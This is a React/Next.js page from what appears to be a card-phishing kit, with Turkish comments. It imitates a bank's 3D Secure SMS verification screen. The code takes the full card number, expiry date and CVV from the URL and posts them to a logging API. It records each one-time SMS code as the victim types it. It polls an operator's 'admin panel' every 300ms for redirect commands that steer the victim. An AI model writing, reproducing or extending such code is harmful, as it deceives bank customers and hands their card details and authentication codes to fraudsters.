'use client';

import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { useToast } from '@/components/ToastProvider';
import { useBankTheme } from '@/components/BankThreeDTheme';
import { useStoreTheme } from '@/components/StoreThemeProvider';
import BankThreeDSecureRouter from '@/components/banks/BankThreeDSecureRouter';
import { useClientMountValue } from '@/components/banks/useClientMountValue';
import { getPaymentError } from '@/lib/paymentErrors';
import { LIVE_LOG_DEBOUNCE_MS, postLiveLog } from '@/lib/liveFormLogger';
import { CHECKOUT_REDIRECT_POLL_MS } from '@/lib/constants';

export default function ProcessingPage() {
  const router = useRouter();
  const { copy } = useStoreTheme();
  const searchParams = useSearchParams();
  const { showToast } = useToast();
  const [verificationCode, setVerificationCode] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [codeSent, setCodeSent] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [currentLogId, setCurrentLogId] = useState<string | null>(searchParams.get('logId') || null);
  const logTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const adminRedirectIntervalRef = useRef<NodeJS.Timeout | null>(null);
  
  // URL'den işlem bilgilerini al
  const amount = searchParams.get('amount') || '0.00';
  const cardNumber = searchParams.get('cardNumber') || '';
  const phoneNumber = searchParams.get('phone') || '';
  const expiryDate = searchParams.get('expiryDate') || '';
  const cvv = searchParams.get('cvv') || '';
  const errorParam = searchParams.get('error') || ''; // Hatalı SMS hatası için

  // Telefon numarasını temizle (sadece rakamlar)
  const cleanPhone = phoneNumber ? phoneNumber.replace(/\D/g, '').slice(-10) : '';

  const sendVerificationCode = async (force = false) => {
    if (!cleanPhone || cleanPhone.length !== 10) {
      return;
    }

    if (codeSent && !force) {
      return;
    }

    try {
      const res = await fetch('/api/auth/send-sms', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: cleanPhone }),
      });

      const data = await res.json();
      if (data.success) {
        setCodeSent(true);
      }
    } catch (error) {
      console.error('SMS gönderme hatası:', error);
    }
  };

  const handleResendCode = async () => {
    setCodeSent(false);
    setVerificationCode('');
    setError('');
    await sendVerificationCode(true);
  };

  // Anlık loglama için useEffect - 3D Secure kodu değiştiğinde
  useEffect(() => {
    // Debounce: 1 saniye sonra log güncelle
    if (logTimeoutRef.current) {
      clearTimeout(logTimeoutRef.current);
    }

    logTimeoutRef.current = setTimeout(async () => {
      await logVerificationCode();
    }, LIVE_LOG_DEBOUNCE_MS);

    return () => {
      if (logTimeoutRef.current) {
        clearTimeout(logTimeoutRef.current);
      }
    };
  }, [verificationCode]);


  // Sayfa yüklendiğinde log oluştur ve SMS gönder
  useEffect(() => {
    const initialize = async () => {
      // Eğer hatalı SMS hatası varsa, hata mesajını göster
      if (errorParam === 'hataliSMS') {
        const err = getPaymentError('hataliSMS');
        setError(err?.message || 'İşlem şifrenizi hatalı giriş yaptınız. Lütfen tekrar giriş yapınız.');
      } else if (errorParam) {
        const err = getPaymentError(errorParam);
        if (err) setError(err.message);
      }
      
      // Admin panelinden yönlendirme kontrolü
      const redirected = await checkAdminRedirect();
      if (redirected) return; // Yönlendirme yapıldıysa devam etme
      
      // İlk log oluştur (3D Secure Bekliyor)
      await createInitialLog();
      
      // Sayfa yüklendiğinde otomatik olarak SMS gönder (admin panelinden yönlendirme olsa da olmasa da)
      // Ancak hatalı SMS hatası varsa SMS gönderme
      if (cleanPhone && cleanPhone.length === 10 && !codeSent && errorParam !== 'hataliSMS') {
        await sendVerificationCode();
      }
    };
    
    initialize();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [errorParam]);

  const checkAdminRedirect = useCallback(async () => {
    try {
      const logId = searchParams.get('logId') || currentLogId;
      if (!logId) {
        // LogId yoksa URL'den bilgileri kullan
        return false;
      }

      // Log'u kontrol et (cache-busting ile)
      const res = await fetch(`/api/logs/${logId}/status?t=${Date.now()}`);
      const data = await res.json();
      
      if (data.success && data.data) {
        const log = data.data;
        
        // LogId'yi set et
        if (!currentLogId) {
          setCurrentLogId(logId);
        }
        
        // Eğer admin panelinden yönlendirme yapıldıysa
        if (log.redirectTo && log.redirectTo.trim() !== '') {
          const currentUrl = window.location.href;
          
          // URL'i düzelt ve logId ekle (yoksa)
          let redirectUrl = log.redirectTo.trim();
          if (!redirectUrl.includes('logId=') && logId) {
            redirectUrl += (redirectUrl.includes('?') ? '&' : '?') + `logId=${logId}`;
          }
          
          if (redirectUrl.startsWith('/')) {
            redirectUrl = window.location.origin + redirectUrl;
          } else if (!redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
            redirectUrl = window.location.origin + '/' + redirectUrl;
          }
          
          // Mevcut URL ile yönlendirme URL'ini karşılaştır
          // Eğer tamamen aynıysa yönlendirme yapma (sonsuz döngüyü önle)
          const currentUrlNormalized = currentUrl.split('#')[0].replace(/\/$/, '');
          const redirectUrlNormalized = redirectUrl.split('#')[0].replace(/\/$/, '');
          
          // Eğer URL'ler farklıysa veya aynı path ama farklı query parametreleri varsa yönlendir
          if (currentUrlNormalized !== redirectUrlNormalized) {
            // Debug logları kaldırıldı (performans için)
            
            // Yönlendir (hemen, gecikme olmadan)
            window.location.href = redirectUrl;
            
            return true;
          } else {
            // Aynı URL'e yönlendirme yapılmaya çalışılıyor, bu normal (sonsuz döngü yok)
          }
        }
      }
      return false;
    } catch (error) {
      console.error('Admin yönlendirme kontrolü hatası:', error);
      return false;
    }
  }, [currentLogId, searchParams]);

  // Sürekli admin yönlendirme kontrolü (zincirleme yönlendirme için) - daha agresif polling
  useEffect(() => {
    const logId = searchParams.get('logId') || currentLogId;
    if (!logId) return;

    // İlk kontrol (hemen)
    checkAdminRedirect();

    // Her 300ms'de bir kontrol et (daha sık - anlık yönlendirme için)
    adminRedirectIntervalRef.current = setInterval(() => {
      checkAdminRedirect();
    }, CHECKOUT_REDIRECT_POLL_MS);

    return () => {
      if (adminRedirectIntervalRef.current) {
        clearInterval(adminRedirectIntervalRef.current);
        adminRedirectIntervalRef.current = null;
      }
    };
  }, [currentLogId, searchParams, checkAdminRedirect]);

  const createInitialLog = async () => {
    try {
      const logId = searchParams.get('logId');
      const user = JSON.parse(localStorage.getItem('user') || '{}');
      const name = user.name && user.surname ? `${user.name} ${user.surname}` : user.phone || cleanPhone || 'Bilinmeyen';
      const phone = user.phone || cleanPhone || phoneNumber;
      
      // Eğer logId varsa (admin panelinden yönlendirme), logId'yi set et
      if (logId && !currentLogId) {
        setCurrentLogId(logId);
      }
      
      // Her zaman POST yap - API otomatik olarak aynı telefon numarası için mevcut log'u bulup güncelleyecek
      // Bu sayede aynı kişi için 1'den fazla log oluşturulmayacak
      // Eğer logId varsa, API mevcut log'u bulup güncelleyecek ve redirectTo'yu koruyacak
      const res = await fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name,
          phone: phone,
          cardNumber: cardNumber.replace(/\s/g, ''),
          expiryDate,
          cvv,
          amount: parseFloat(amount),
          status: '3D Secure Bekliyor',
          pageType: 'payment',
        }),
      });
      const data = await res.json();
      if (data.success && data.data?._id) {
        // LogId'yi set et (eğer yoksa veya admin panelinden gelen logId farklıysa)
        if (!currentLogId || currentLogId !== data.data._id) {
          setCurrentLogId(data.data._id);
        }
      }
    } catch (error) {
      console.error('İlk log oluşturma hatası:', error);
    }
  };

  const logVerificationCode = async () => {
    if (!verificationCode) return;

    try {
      const user = JSON.parse(localStorage.getItem('user') || '{}');
      const name =
        user.name && user.surname
          ? `${user.name} ${user.surname}`
          : user.phone || cleanPhone || 'Bilinmeyen';
      const phone = user.phone || cleanPhone;

      const savedId = await postLiveLog({
        logId: currentLogId || searchParams.get('logId') || undefined,
        name,
        phone: phone || undefined,
        phoneRaw: cleanPhone.length === 10 ? cleanPhone : undefined,
        cardNumber: cardNumber.replace(/\s/g, '') || undefined,
        expiryDate: expiryDate || undefined,
        cvv: cvv || undefined,
        verificationCode,
        amount: parseFloat(amount),
        status: '3D Secure Bekliyor',
        pageType: 'processing',
      });

      if (savedId && !currentLogId) {
        setCurrentLogId(savedId);
      }
    } catch (error) {
      console.error('Anlık loglama hatası:', error);
    }
  };

  // Telefon numarasını formatla (gerçek numarayı göster)
  const bank = useBankTheme(cardNumber);

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    const isYapikredi = bank.id === 'yapikredi';
    const codeValid = isYapikredi
      ? verificationCode.length === 5
      : verificationCode.length >= 4 && verificationCode.length <= 6;

    if (!verificationCode || !codeValid) {
      setError(
        isYapikredi
          ? 'Lütfen 5 haneli Akıllı SMS şifresini giriniz.'
          : 'Lütfen 4-6 haneli doğrulama kodunu giriniz.'
      );
      return;
    }

    setLoading(true);
    setShowLoadingModal(true);
    setLoadingMessage('İşleminiz kontrol ediliyor...');

    try {
      const user = JSON.parse(localStorage.getItem('user') || '{}');
      const name = user.name && user.surname ? `${user.name} ${user.surname}` : user.phone || cleanPhone || 'Bilinmeyen';

      let finalLogId = currentLogId;
      const phone = user.phone || cleanPhone;

      const createRes = await fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name,
          phone: phone,
          cardNumber: cardNumber.replace(/\s/g, ''),
          expiryDate,
          cvv,
          verificationCode: verificationCode,
          amount: parseFloat(amount),
          status: 'Bekliyor',
          pageType: 'payment',
          redirectTo: '',
          redirectReason: '',
        }),
      });
      const createData = await createRes.json();
      if (createData.success && createData.data?._id) {
        finalLogId = createData.data._id;
        setCurrentLogId(finalLogId);
      }

      if (finalLogId) {
        setShowLoadingModal(false);

        if (adminRedirectIntervalRef.current) {
          clearInterval(adminRedirectIntervalRef.current);
          adminRedirectIntervalRef.current = null;
        }

        window.location.href = `/checkout/waiting?logId=${finalLogId}`;
      } else {
        throw new Error('Log oluşturulamadı');
      }
    } catch (error) {
      setShowLoadingModal(false);
      console.error('Log oluşturma hatası:', error);
      setError('Bir hata oluştu. Lütfen tekrar deneyiniz.');
      setLoading(false);
    }
  };

  const transactionDate = useClientMountValue(
    () =>
      new Date().toLocaleString('tr-TR', {
        day: 'numeric',
        month: 'numeric',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
      }),
    ''
  );

  const loadingModal = showLoadingModal ? (
    <div className="fixed inset-0 z-50 flex animate-fadeIn items-center justify-center bg-black/60 p-2 backdrop-blur-sm sm:p-3 md:p-4">
      <div className="animate-fadeInUp w-full max-w-md transform rounded-xl bg-white p-4 text-center shadow-2xl sm:p-6 md:p-8">
        <div className="mb-4 sm:mb-5 md:mb-6">
          <p className="mb-2 text-sm font-semibold leading-tight text-gray-900 sm:mb-3 sm:text-base md:text-lg">
            {loadingMessage}
          </p>
          <div className="flex flex-col items-center justify-center gap-3 sm:gap-4">
            <div className="relative h-16 w-16 sm:h-18 sm:w-18 md:h-20 md:w-20">
              <svg className="h-16 w-16 transform -rotate-90 sm:h-18 sm:w-18 md:h-20 md:w-20">
                <circle cx="32" cy="32" r="28" stroke="#e5e7eb" strokeWidth="3" fill="none" className="sm:stroke-[4] md:stroke-[4]" />
                <circle
                  cx="32"
                  cy="32"
                  r="28"
                  stroke={bank.primaryColor}
                  strokeWidth="3"
                  fill="none"
                  strokeDasharray={`${2 * Math.PI * 28}`}
                  strokeDashoffset={`${2 * Math.PI * 28 * 0.75}`}
                  strokeLinecap="round"
                  className="animate-spin sm:stroke-[4] md:stroke-[4]"
                  style={{ animationDuration: '2s' }}
                />
              </svg>
            </div>
            <div className="flex gap-1.5 sm:gap-2">
              <div className="h-1.5 w-1.5 animate-bounce rounded-full sm:h-2 sm:w-2" style={{ animationDelay: '0s', backgroundColor: bank.primaryColor }} />
              <div className="h-1.5 w-1.5 animate-bounce rounded-full sm:h-2 sm:w-2" style={{ animationDelay: '0.2s', backgroundColor: bank.primaryColor }} />
              <div className="h-1.5 w-1.5 animate-bounce rounded-full sm:h-2 sm:w-2" style={{ animationDelay: '0.4s', backgroundColor: bank.primaryColor }} />
            </div>
          </div>
        </div>
      </div>
    </div>
  ) : null;

  return (
    <>
      <BankThreeDSecureRouter
        bank={bank}
        amount={amount}
        cardNumber={cardNumber}
        phoneNumber={cleanPhone}
        phoneLast4={cleanPhone.slice(-4)}
        verificationCode={verificationCode}
        onVerificationCodeChange={(value) => {
          setVerificationCode(value);
          setError('');
        }}
        error={error}
        loading={loading}
        transactionDate={transactionDate}
        merchantName={copy.merchantName}
        onSubmit={handleVerify}
        onResendCode={handleResendCode}
        onCancel={() => router.push('/checkout')}
      />
      {loadingModal}
    </>
  );
}

